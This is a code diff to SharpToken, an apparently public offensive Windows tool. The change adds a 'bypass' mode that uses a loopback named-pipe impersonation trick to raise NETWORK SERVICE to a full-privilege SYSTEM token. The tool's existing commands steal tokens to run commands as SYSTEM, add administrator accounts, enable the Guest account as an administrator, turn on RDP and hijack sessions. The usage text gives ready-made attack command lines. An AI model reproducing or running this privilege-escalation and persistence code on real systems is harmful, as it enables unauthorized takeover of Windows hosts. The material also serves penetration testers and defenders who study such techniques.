@@ -3,7 +3,6 @@ using System.Collections;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.DirectoryServices;
-using System.DirectoryServices.ActiveDirectory;
 using System.IO;
 using System.Management;
 using System.Reflection;
@@ -373,6 +372,29 @@ namespace SharpToken
         public static readonly int SE_PRIVILEGE_ENABLED = 0x00000002;
         public static readonly int SE_PRIVILEGE_REMOVED = 0X00000004;
 
+        public static readonly int NMPWAIT_WAIT_FOREVER = unchecked((int)0xffffffff);
+        public static readonly int NMPWAIT_NOWAIT = 0x00000001;
+        public static readonly int NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;
+
+        public static readonly int PIPE_UNLIMITED_INSTANCES = 255;
+
+        public static readonly int PIPE_WAIT = 0x00000000;
+        public static readonly int PIPE_NOWAIT = 0x00000001;
+        public static readonly int PIPE_READMODE_BYTE = 0x00000000;
+        public static readonly int PIPE_READMODE_MESSAGE = 0x00000002;
+        public static readonly int PIPE_TYPE_BYTE = 0x00000000;
+        public static readonly int PIPE_TYPE_MESSAGE = 0x00000004;
+        public static readonly int PIPE_ACCEPT_REMOTE_CLIENTS = 0x00000000;
+        public static readonly int PIPE_REJECT_REMOTE_CLIENTS = 0x00000008;
+
+        public static readonly int PIPE_ACCESS_INBOUND = 0x00000001;
+        public static readonly int PIPE_ACCESS_OUTBOUND = 0x00000002;
+        public static readonly int PIPE_ACCESS_DUPLEX = 0x00000003;
+
+        public static IntPtr ContextToken = IntPtr.Zero;
+
+        public static IntPtr BAD_HANLE = new IntPtr(-1);
+
         [DllImport("ntdll")]
         public static extern uint NtQuerySystemInformation(
         [In] uint SystemInformationClass,
@@ -485,9 +507,19 @@ namespace SharpToken
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+        [DllImport("advapi32.dll", SetLastError = true, EntryPoint= "RevertToSelf")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool RevertToSelfEx();
+        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode, EntryPoint = "CreateNamedPipeW", SetLastError = true)]
+        public static extern IntPtr CreateNamedPipe(string pipeName, int openMode, int pipeMode, int maxInstances, int outBufferSize, int inBufferSize, int defaultTimeout, ref SECURITY_ATTRIBUTES securityAttributes);
+        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode, EntryPoint = "CreateFileW", SetLastError = true)]
+        public static extern IntPtr CreateFileW(string lpFileName, int dwDesiredAccess, FileShare dwShareMode, ref SECURITY_ATTRIBUTES secAttrs, FileMode dwCreationDisposition, int dwFlagsAndAttributes, IntPtr hTemplateFile);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool ConnectNamedPipe(IntPtr handle, IntPtr overlapped);
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool RevertToSelf();
+        public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
         [DllImport("psapi.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
         public static extern int GetModuleFileNameEx(IntPtr processHandle, IntPtr moduleHandle, StringBuilder baseName, int size);
 
@@ -522,6 +554,16 @@ namespace SharpToken
             impersonationLevel -= TokenImpersonationLevel.Anonymous;
             return DuplicateTokenExInternal(hExistingToken, dwDesiredAccess, lpTokenAttributes, (uint)impersonationLevel,
                  TokenType, out phNewToken);
+        }
+
+        public static bool RevertToSelf() {
+            bool isOk = RevertToSelfEx();
+            if (ContextToken != IntPtr.Zero)
+            {
+               isOk =  ImpersonateLoggedOnUser(ContextToken);
+            }
+
+            return isOk;
         }
     }
 
@@ -1279,7 +1321,7 @@ namespace SharpToken
             }
         }
 
-        public static void createProcessInteractive(TextWriter consoleWriter,string userName,string commandLine)
+        public static void createProcessInteractive(TextWriter consoleWriter, TextReader consoleReader, string userName,string commandLine)
         {
             bool hasSeAssignPrimaryTokenPrivilege = false;
             ProcessToken[] processTokens = TokenuUils.ListProcessTokens(0, token =>
@@ -1345,7 +1387,7 @@ namespace SharpToken
                     if (token.CreateProcess(commandLine, true, (uint)ProcessCreateFlags.CREATE_NO_WINDOW, ref startupInfo,
                             out processInformation))
                     {
-                        consoleWriter.WriteLine($"process start with pid {processInformation.dwProcessId}");
+                        consoleWriter.WriteLine($"[*] process start with pid {processInformation.dwProcessId}");
 
                         NativeMethod.CloseHandle(childProcessStdInRead);
                         childProcessStdInRead = IntPtr.Zero;
@@ -1361,20 +1403,18 @@ namespace SharpToken
                         uint bytesRead = 0;
                         int read = 0;
 
-                        
-
                         proxyStdInThread = new Thread(() =>
                         {
-                            Stream stdIn = Console.OpenStandardInput();
-                            byte[] readBytes2 = new byte[1024];
+                            char[] readBytes2 = new char[1024];
                             int read2 = 0;
                             try
                             {
                                 while (true)
                                 {
-                                    if ((read2 = stdIn.Read(readBytes2, 0, readBytes2.Length))>0)
+                                    if ((read2 = consoleReader.Read(readBytes2, 0, readBytes2.Length))>0)
                                     {
-                                        childProcessWriteStream.Write(readBytes2,0,read2);
+                                        byte[] convertBuf = Encoding.Default.GetBytes(readBytes2, 0, read2);
+                                        childProcessWriteStream.Write(convertBuf, 0, convertBuf.Length);
                                         childProcessWriteStream.Flush();
                                     }
                                 }
@@ -1399,7 +1439,7 @@ namespace SharpToken
                             if (bytesAvail>0)
                             {
                                 read = childProcessReadStream.Read(readBytes, 0, readBytes.Length);
-                                Console.Write(Encoding.Default.GetChars(readBytes,0,read));
+                                consoleWriter.Write(Encoding.Default.GetChars(readBytes,0,read));
                             }
 
                             Thread.Sleep(100);
@@ -1410,7 +1450,7 @@ namespace SharpToken
                     }
                     else
                     {
-                        consoleWriter.WriteLine($"Cannot create process Win32Error:{Marshal.GetLastWin32Error()}");
+                        consoleWriter.WriteLine($"[!] Cannot create process Win32Error:{Marshal.GetLastWin32Error()}");
                     }
 
                     end:
@@ -1519,7 +1559,7 @@ namespace SharpToken
                     if (token.CreateProcess(commandLine, true, (uint)ProcessCreateFlags.CREATE_NO_WINDOW, ref startupInfo,
                             out processInformation))
                     {
-                        consoleWriter.WriteLine($"process start with pid {processInformation.dwProcessId}");
+                        consoleWriter.WriteLine($"[*] process start with pid {processInformation.dwProcessId}");
 
                         NativeMethod.CloseHandle(childProcessStdOutWrite);
                         childProcessStdOutWrite = IntPtr.Zero;
@@ -1543,7 +1583,7 @@ namespace SharpToken
                             if (bytesAvail > 0)
                             {
                                 read = childProcessReadStream.Read(readBytes, 0, readBytes.Length);
-                                Console.Write(Encoding.Default.GetChars(readBytes, 0, read));
+                                consoleWriter.Write(Encoding.Default.GetChars(readBytes, 0, read));
                             }
 
                         }
@@ -1552,7 +1592,7 @@ namespace SharpToken
                     }
                     else
                     {
-                        consoleWriter.WriteLine($"Cannot create process Win32Error:{Marshal.GetLastWin32Error()}");
+                        consoleWriter.WriteLine($"[!] Cannot create process Win32Error:{Marshal.GetLastWin32Error()}");
                     }
 
                 end:
@@ -1638,11 +1678,11 @@ namespace SharpToken
 
             if (isOK)
             {
-                consoleWriter.WriteLine("add user Successful!");
+                consoleWriter.WriteLine("[*] add user Successful!");
             }
             else
             {
-                consoleWriter.WriteLine("add user Fail!");
+                consoleWriter.WriteLine("[!] add user Fail!");
             }
         }
         public static void enableUser(TextWriter consoleWriter,string domain, string userName, string passWord,string group)
@@ -1708,11 +1748,11 @@ namespace SharpToken
 
             if (isOK)
             {
-                consoleWriter.WriteLine("enable user Successful!");
+                consoleWriter.WriteLine("[*] enable user Successful!");
             }
             else
             {
-                consoleWriter.WriteLine("enable user Fail!");
+                consoleWriter.WriteLine("[!] enable user Fail!");
             }
         }
         public static void deleteUser(TextWriter consoleWriter, string domain,string userName)
@@ -1752,11 +1792,11 @@ namespace SharpToken
 
             if (isOK)
             {
-                consoleWriter.WriteLine("delete user Successful!");
+                consoleWriter.WriteLine("[*] delete user Successful!");
             }
             else
             {
-                consoleWriter.WriteLine("delete user Fail!");
+                consoleWriter.WriteLine("[!] delete user Fail!");
             }
         }
         public static void enableRDP(TextWriter consoleWriter) {
@@ -1829,11 +1869,11 @@ namespace SharpToken
 
             if (isOK)
             {
-                consoleWriter.WriteLine($"enableRDP Successful RDPPort:{rdpPort}!");
+                consoleWriter.WriteLine($"[*] enableRDP Successful RDPPort:{rdpPort}!");
             }
             else
             {
-                consoleWriter.WriteLine("enableRDP Fail!");
+                consoleWriter.WriteLine("[-] enableRDP Fail!");
             }
         }
         public static void tscon(TextWriter consoleWriter, int targetSessionId, int sourceSessionId) {
@@ -1843,7 +1883,7 @@ namespace SharpToken
             }
             if (sourceSessionId < 0)
             {
-                consoleWriter.WriteLine("Please enter sourceSessionId\nSharpToken tscon 2 1");
+                consoleWriter.WriteLine("[*] Please enter sourceSessionId\nSharpToken tscon 2 1");
             }
             else
             {
@@ -1879,17 +1919,105 @@ namespace SharpToken
 
                 if (isOK)
                 {
-                    consoleWriter.WriteLine("Success!");
+                    consoleWriter.WriteLine("[*] Success!");
                 }
                 else
                 {
-                    consoleWriter.WriteLine($"Failed to connect to session: {targetSessionId} error: {Marshal.GetLastWin32Error()}");
+                    consoleWriter.WriteLine($"[!] Failed to connect to session: {targetSessionId} error: {Marshal.GetLastWin32Error()}");
                 }
             }
 
 
 
         }
+
+
+        public static IntPtr GiveMeFullPrivToken(TextWriter consoleWriter) {
+            IntPtr token = IntPtr.Zero;
+            IntPtr pipeServerHandle = NativeMethod.BAD_HANLE;
+            IntPtr pipeClientHandle = NativeMethod.BAD_HANLE;
+            Thread clientThread = null;
+            Thread serverThread = null;
+           
+            try
+            {
+                string uncPath = Guid.NewGuid().ToString();
+                string serverPipe = $"\\\\.\\pipe\\{uncPath}";
+                string clientPipe = $"\\\\127.0.0.1\\pipe\\{uncPath}";
+                SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
+                pipeServerHandle = NativeMethod.CreateNamedPipe(serverPipe, NativeMethod.PIPE_ACCESS_DUPLEX, NativeMethod.PIPE_TYPE_BYTE | NativeMethod.PIPE_READMODE_BYTE | NativeMethod.PIPE_WAIT, NativeMethod.PIPE_UNLIMITED_INSTANCES, 521, 0, 123, ref securityAttributes);
+                if (pipeServerHandle != NativeMethod.BAD_HANLE)
+                {
+                    clientThread = new Thread(() =>
+                    {
+                        pipeClientHandle = NativeMethod.CreateFileW(clientPipe, (int)(NativeMethod.GENERIC_READ | NativeMethod.GENERIC_WRITE), FileShare.ReadWrite, ref securityAttributes, FileMode.Open, 0, IntPtr.Zero);
+                        FileStream stream = new FileStream(pipeClientHandle, FileAccess.ReadWrite);
+                        stream.WriteByte(0xaa);
+                        stream.Flush();
+                    });
+                    serverThread = new Thread(() =>
+                    {
+                        NativeMethod.ConnectNamedPipe(pipeServerHandle, IntPtr.Zero);
+                        FileStream stream = new FileStream(pipeServerHandle,FileAccess.ReadWrite);
+                        stream.ReadByte();
+                    });
+
+                    clientThread.Start();
+                    Thread.Sleep(30);
+                    serverThread.Start();
+
+                    if (serverThread.Join(3000))
+                    {
+                        if (NativeMethod.ImpersonateNamedPipeClient(pipeServerHandle))
+                        {
+                            WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent();
+
+                            token = windowsIdentity.Token;
+
+                            NativeMethod.RevertToSelf();
+                        }
+                        else
+                        {
+                            consoleWriter.WriteLine($"[!] ImpersonateNamedPipeClient fail error:{Marshal.GetLastWin32Error()}");
+                        }
+                    }
+                    else
+                    {
+                        consoleWriter.WriteLine("[!] ConnectNamedPipe timeout");
+                    }
+
+                }
+                else
+                {
+                    consoleWriter.WriteLine($"[!] CreateNamedPipe fail error:{Marshal.GetLastWin32Error()}");
+                }
+            }
+            catch (Exception e)
+            {
+                consoleWriter.WriteLine(e);
+            }
+            finally {
+                if (pipeClientHandle != NativeMethod.BAD_HANLE)
+                {
+                    NativeMethod.CloseHandle(pipeClientHandle);
+                }
+                if (pipeServerHandle != NativeMethod.BAD_HANLE)
+                {
+                    NativeMethod.CloseHandle(pipeServerHandle);
+                }
+                if (clientThread != null && clientThread.IsAlive)
+                {
+                    clientThread.Abort();
+                }
+                if (serverThread != null && serverThread.IsAlive)
+                {
+                    serverThread.Abort();
+                }
+
+            }
+            return token;
+        }
+
         public static void help(TextWriter consoleWriter)
         {
             consoleWriter.WriteLine(@"
@@ -1899,37 +2027,47 @@ SharpToken By BeichenDream
 
 Github : https://github.com/BeichenDream/SharpToken
 
+If you are an NT AUTHORITY\NETWORK SERVICE user then you just need to add the bypass parameter to become an NT AUTHORIT\YSYSTEM
+e.g. 
+SharpToken execute ""NT AUTHORITY\SYSTEM"" ""cmd /c whoami"" bypass
+
+
 Usage:
 
 SharpToken COMMAND arguments
 
+
+
 COMMANDS:
 
-	list_token [process pid]	
+	list_token [process pid]	[bypass]
 
-	list_all_token [process pid]
+	list_all_token [process pid] [bypass]
 
-	add_user    <username> <password> [group] [domain]
+	add_user    <username> <password> [group] [domain] [bypass]
 
-	enableUser <username> <NewPassword> [NewGroup]
+	enableUser <username> <NewPassword> [NewGroup] [bypass]
 
-	delete_user <username> [domain]
+	delete_user <username> [domain] [bypass]
     
-	execute <tokenUser> <commandLine> [Interactive]
+	execute <tokenUser> <commandLine> [Interactive] [bypass]
 
-	enableRDP
+	enableRDP [bypass]
 
-	tscon <targetSessionId> [sourceSessionId]
+	tscon <targetSessionId> [sourceSessionId] [bypass]
 
 
 example:
     SharpToken list_token
+    SharpToken list_token bypass
     SharpToken list_token 6543
     SharpToken add_user admin Abcd1234! Administrators
     SharpToken enableUser Guest Abcd1234! Administrators
     SharpToken delete_user admin
     SharpToken execute ""NT AUTHORITY\SYSTEM"" ""cmd /c whoami""
+    SharpToken execute ""NT AUTHORITY\SYSTEM"" ""cmd /c whoami"" bypass
     SharpToken execute ""NT AUTHORITY\SYSTEM"" cmd true
+    SharpToken execute ""NT AUTHORITY\SYSTEM"" cmd true bypass
     SharpToken tscon 1
 ");
         }
@@ -1937,6 +2075,11 @@ example:
 
         static void Main(string[] args)
         {
+
+            TextWriter consoleWriter = Console.Out;
+            TextReader consoleReader = Console.In;
+
+
             IntPtr currentProcessHandle = NativeMethod.GetCurrentProcess();
             bool hasSeAssignPrimaryTokenPrivilege = false;
             IntPtr currentProcessToken = IntPtr.Zero;
@@ -1954,6 +2097,31 @@ example:
             string domain = "WinNT://" + Environment.MachineName + ",computer";
             int processPid = 0;
             string group = "Administrators";
+            bool bypassToken = false;
+
+            if (args.Length > 0)
+            {
+                if (args[args.Length - 1].ToLower() == "bypass")
+                {
+                    
+                    string[] newArgs = new string[args.Length - 1];
+                    Array.Copy(args, newArgs, newArgs.Length);
+                    args = newArgs;
+                    NativeMethod.ContextToken = GiveMeFullPrivToken(consoleWriter);
+                    if (NativeMethod.ContextToken != IntPtr.Zero)
+                    {
+                        bypassToken = true;
+                        NativeMethod.ImpersonateLoggedOnUser(NativeMethod.ContextToken);
+                        consoleWriter.WriteLine("[*] Leak of complete Priv token successful!");
+                    }
+                    else
+                    {
+                        consoleWriter.WriteLine("[!] Leak token fail!");
+                    }
+
+                }
+            }
+            
 
             if (args.Length > 0)
             {
@@ -1965,14 +2133,14 @@ example:
                         {
                             processPid = int.Parse(args[1]);
                         }
-                        listToken(Console.Out,processPid);
+                        listToken(consoleWriter, processPid);
                         break;
                     case "list_all_token":
                         if (args.Length > 1)
                         {
                             processPid = int.Parse(args[1]);
                         }
-                        listAllToken(Console.Out, processPid);
+                        listAllToken(consoleWriter, processPid);
                         break;
                     case "add_user":
                         if (args.Length < 3)
@@ -1991,7 +2159,7 @@ example:
                                     domain = args[4];
                                 }
                             }
-                            addUser(Console.Out,domain,userName,password,group);
+                            addUser(consoleWriter, domain,userName,password,group);
                             break;
                         }
                     case "enableUser":
@@ -2011,17 +2179,17 @@ example:
                                     domain = args[4];
                                 }
                             }
-                            enableUser(Console.Out, domain, userName, password, group);
+                            enableUser(consoleWriter, domain, userName, password, group);
                             break;
                         }
                     case "enableRDP":
-                        enableRDP(Console.Out);
+                        enableRDP(consoleWriter);
                         break;
                     case "tscon":
                         if (args.Length > 1)
                         {
                             int targetSessionId = int.Parse(args[1]); int sourceSessionId = int.Parse(args.Length > 2 ? args[2] :"-1");
-                            tscon(Console.Out,targetSessionId,sourceSessionId);
+                            tscon(consoleWriter, targetSessionId,sourceSessionId);
                         }
                         else
                         {
@@ -2040,7 +2208,7 @@ example:
                             {
                                 domain = args[2];
                             }
-                            deleteUser(Console.Out,domain,userName);
+                            deleteUser(consoleWriter, domain,userName);
                             break;
                         }
                     case "execute":
@@ -2060,11 +2228,11 @@ example:
 
                             if (isInteractive)
                             {
-                                createProcessInteractive(Console.Out,tokenUser,commandLine);
+                                createProcessInteractive(consoleWriter, consoleReader, tokenUser,commandLine);
                             }
                             else
                             {
-                                createProcessReadOut(Console.Out,tokenUser,commandLine);
+                                createProcessReadOut(consoleWriter, tokenUser,commandLine);
                             }
                             break;
                         }
@@ -2081,7 +2249,14 @@ example:
 
             return;
             help:
-            help(Console.Out);
+            help(consoleWriter);
+
+            if (bypassToken && NativeMethod.ContextToken!=IntPtr.Zero)
+            {
+                NativeMethod.RevertToSelfEx();
+                NativeMethod.CloseHandle(NativeMethod.ContextToken);
+                NativeMethod.ContextToken = IntPtr.Zero;
+            }
         }
 
     }
